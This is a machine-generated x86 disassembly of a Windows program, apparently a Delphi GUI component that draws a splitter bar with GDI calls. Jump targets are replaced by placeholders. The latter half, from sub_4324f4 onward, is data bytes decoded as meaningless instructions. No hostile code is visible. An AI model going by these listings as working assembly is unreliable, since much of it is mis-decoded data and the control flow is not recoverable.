call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_431780
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x170 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4550c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4317b0
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_453e1c
push eax
call GetDCEx
mov [ ebx + 0x180 ] eax
cmp [ ebx + 0x1a8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
mov eax [ ebx + 0x170 ]
call sub_424244
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
mov [ ebx + 0x1a4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424068
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx 0xffffff
xor eax eax
call sub_429254
mov edx eax
mov eax esi
call sub_4241e4
sub_43182c
push ebx
add esp 0xfffffff8
mov ebx eax
mov al [ ebx + 0x184 ]
xor al 0x1
mov [ ebx + 0x184 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416c28
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ac ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ac ]
mov [ esp ] eax
jmp r-xdata
push 0x5a0049
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_431898
push ebx
mov ebx eax
mov eax [ ebx + 0x1a4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_453e1c
push eax
call ReleaseDC
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
pop ebx
retn
call sub_403174
xor eax eax
mov [ ebx + 0x170 ] eax
sub_4318e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416c28
mov al [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_450b4c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_450b10
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_44cfd4
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_4319cc
push ebx
mov ebx eax
mov eax ebx
call sub_44ca40
mov ax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_44d840
mov dx 0xfff1
mov eax ebx
call sub_44d840
jmp r-xdata
pop ebx
retn
sub_431a08
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424210
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x160 ]
call sub_4245fc
cmp [ ebx + 0x16d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_42400c
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_423ff0
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_423f30
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_42432c
mov eax ebx
call sub_44d038
push eax
mov eax ebx
call sub_44d07c
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_424700
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000014
call sub_423584
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_424a70
push eax
call FrameRect
push esi
call DeleteObject
push 0xfffffffe
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000010
call sub_423584
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_424a70
push eax
call FrameRect
push esi
call DeleteObject
sub_431b64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x188 ]
jg r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_431b94
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_431bc0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44ebfc
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_4318e0
mov [ ebx + 0x174 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_416c28
mov eax [ ebp - 0xc ]
mov [ ebx + 0x178 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x17c ] eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_44d07c
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_44d038
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x18c ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x18c ] eax
jmp r-xdata
inc esi
xor edi edi
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x168 ] eax
mov edx [ eax + 0x1d8 ]
mov [ ebx + 0x198 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebx + 0x19c ] edx
mov eax [ ebx + 0x168 ]
mov [ eax + 0x1dc ] ebx
mov [ eax + 0x1d8 ] sub_4320d0
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x18c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_431fbc
mov eax ebx
call sub_4317b0
mov eax ebx
call sub_464de8
mov edx eax
mov ecx [ edx + 0x220 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_43182c
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_450b10
mov dl [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_450b10
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x18c ] eax
sub_431d64
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1a0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_44ce14
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4506b4
xor edx edx
push ebp
push sub_431ea0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x44 ]
call sub_44cdc8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_44ce14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4506bc
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_44cdf0
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4506b4
xor edx edx
push ebp
push sub_431e33
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x40 ]
call sub_44cda4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_44cdf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4506bc
retn
jmp r-xdata
sub_431ee8
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
mov dl [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x17c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x178 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x188 ]
jge r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x18c ]
jle r-xdata
mov ecx [ esi + 0x188 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x18c ]
mov [ edi ] ecx
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_431fd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44eeb4
test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x174 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_431ee8
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_43182c
sub al 0x2
jne r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_431d64
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x190 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ac ] eax
cmp [ ebx + 0x1a8 ] 0x2
jne r-xdata
mov eax ebx
call sub_43182c
sub al 0x2
jne r-xdata
sub_43207c
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_44ef5c
cmp [ esi + 0x174 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
mov al [ esi + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_43182c
sub al 0x2
jne r-xdata
mov eax esi
call sub_431d64
mov eax esi
mov si 0xffc7
call sub_403370
sub_4320d0
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x19a ] 0x0
je r-xdata
mov eax esi
mov si 0xffc7
call sub_403370
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x19c ]
call [ esi + 0x198 ]
sub_432118
push ebx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
xor eax eax
mov [ ebx + 0x174 ] eax
mov eax ebx
call sub_431898
mov eax [ ebx + 0x168 ]
test eax eax
je r-xdata
mov eax ebx
call sub_43182c
mov edx [ ebx + 0x198 ]
mov [ eax + 0x1d8 ] edx
mov edx [ ebx + 0x19c ]
mov [ eax + 0x1dc ] edx
xor eax eax
mov [ ebx + 0x168 ] eax
sub_4324f4
xchg [ fs : edi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_432569
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432570
retn
sub_43257c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4325ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4325b4
retn
mov eax [ rw-data ]
call sub_403174
sub_432664
or al [ eax ]
add [ eax ] al
sub al 0xa
inc edi
add [ eax + esi * 2 + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
or al [ edi ]
sub [ edi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] ah
inc edi
add ah cl
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ah
or al [ edi ]
test al 0x6f
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] bl
inc edi
add [ eax + 0x70 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] bl
or al [ edi ]
cwde
jb r-xdata
add eax rw-data
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] dl
inc edi
add [ eax + 0x4770 ] ch
add [ eax ] al
add [ eax ] dl
or al [ edi ]
cmp [ ecx + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] cl
inc edi
add [ eax + 0x72 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] cl
or al [ edi ]
in al dx
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43270c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432713
retn
call sub_432648
sub_432740
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432765
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43276c
retn
sub_432787
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4327cc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4327d3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404968
sub_4327ef
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_432834
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43283b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404968
sub_43284b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4328a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4328a8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403eec
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4328b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4328f8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4328ff
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43290c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432931
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432938
retn
sub_432944
dec eax
sub [ ebx ] eax
add edx [ eax ]
push esp
inc ebx
jne r-xdata
or [ ebx + 0x64 ] esp
je r-xdata
dec ecx
jb r-xdata
jae r-xdata
or [ fs : ebx + 0x64 ] esp
insd
inc esp
jb r-xdata
ja r-xdata
jb r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
jns r-xdata
or esp [ ebx + 0x64 ]
jae r-xdata
ja r-xdata
mov eax eax
shr [ edx ] 0x1
inc ebx
outsd
imul ebp [ esi + 0x61 ] 0x43086574
outsd
insd
inc ebx
add [ edx ] al
sub eax [ ebx ]
sub [ eax ] al
add [ eax ] al
enter 0x415d 0x0
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
outsd
insd
inc esp
jb r-xdata
or esp [ fs : ebx + 0x64 ]
jae r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
mov al [ 0xb004329 ]
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
shr [ edx ] 0x1
inc ebx
add [ esi + ebx * 2 + 0x41 ] dl
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
add [ eax + edx * 4 + 0x41 ] cl
add [ eax + edx * 4 + 0x41 ] bh
add [ eax + edx * 4 + 0x41 ] dh
add al al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
insb
jae r-xdata
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
add [ eax ] bl
insb
jae r-xdata
sub eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ch [ ebx ]
inc ebx
add [ eax ] ch
add [ eax ] al
add al cl
pop ebp
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
ja r-xdata
insd
imul esi [ ebx + 0x61 ] 0x64656c62
or ah [ ebx + 0x64 ]
jae r-xdata
push ebx
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + ebp + 0x43 ] al
add [ edx ] cl
arpl [ eax + edx * 2 + 0x72 ] sp
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630b
outsd
jae r-xdata
inc ecx
add [ eax + eax ] ah
insb
jae r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
add [ eax ] al
push cs
push esp
dec eax
popad
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] ch
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
sbb [ ebx ] ch
inc ebx
add [ edi ] al
push cs
push esp
dec eax
popad
outsb
je r-xdata
inc ebx
add [ eax ] al
rcl al 0x2a
arpl [ ebx + esi * 2 + 0x53 ] sp
add [ ebx ] cl
sub [ edx ] ch
inc ebx
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sub al [ ebx ]
sbb [ ebx ] ch
inc ebx
add [ eax ] al
je r-xdata
je r-xdata
push 0x656b6365
or ah [ fs : ebx + 0x64 ]
jae r-xdata
or ah [ ebx + 0x64 ]
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630a
jb r-xdata
add bh bh
jl r-xdata
add [ eax + 0x4372 ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080003 ] al
inc ebx
add ah dl
push ebx
inc ecx
add [ eax + eax ] bl
add bh bh
dec esp
jae r-xdata
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
adc [ eax ] al
push ds
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
jae r-xdata
outsd
popa
jne r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x27
add [ eax ] al
add eax 0x614d0800
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd065646f
movsb [ edi ] [ esi ]
inc ebp
add [ eax ] ah
add [ eax ] al
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
[ ebx + esi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x75 ] al
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ esi ] bl
add [ eax ] al
add esp [ eax - 0x6fffbcd7 ]
inc esp
sub al [ ebx ]
add edx [ ebx ]
push esp
dec eax
popad
sub al [ ebx ]
push es
je r-xdata
add [ eax ] eax
add [ eax ] al
inc eax
or ah [ fs : ebx + 0x64 ]
arpl [ ebp + 0x73 ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc al 0x0
add bh bh
mov al [ 0x1004373 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ 0xffffffffb0ff0000 ] ah
jb r-xdata
push esp
adc [ eax ] al
add bh bh
xchg esp eax
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
and al 0x0
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x6e774f73
or [ ebx + 0x64 ] esp
jae r-xdata
arpl [ ebx + esi * 2 + 0x48 ] sp
arpl [ ebx + esi * 2 + 0x44 ] sp
or esp [ ebx + 0x64 ]
push eax
outsd
jae r-xdata
add [ eax ] al
dec esp
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ esi ] cl
push eax
popad
jb r-xdata
inc ebx
push esp
mov [ ecx ] es
pop esp
mov [ ecx ] es
sbb al 0x72
push 0x78655473
je r-xdata
insb
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ edi - 0x73abffbf ] cl
inc ecx
add [ esp + ecx * 4 + 0x41 ] bl
add [ edx + esi * 2 ] bl
inc eax
add [ eax - 0x53ffbfcd ] bh
xor eax [ eax ]
or al 0x31
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2a ] al
inc ebx
add [ esi ] al
imul ebp [ edi + 0x6e ] 0x6c797453
popad
jb r-xdata
adc [ ebx + 0x64 ] ah
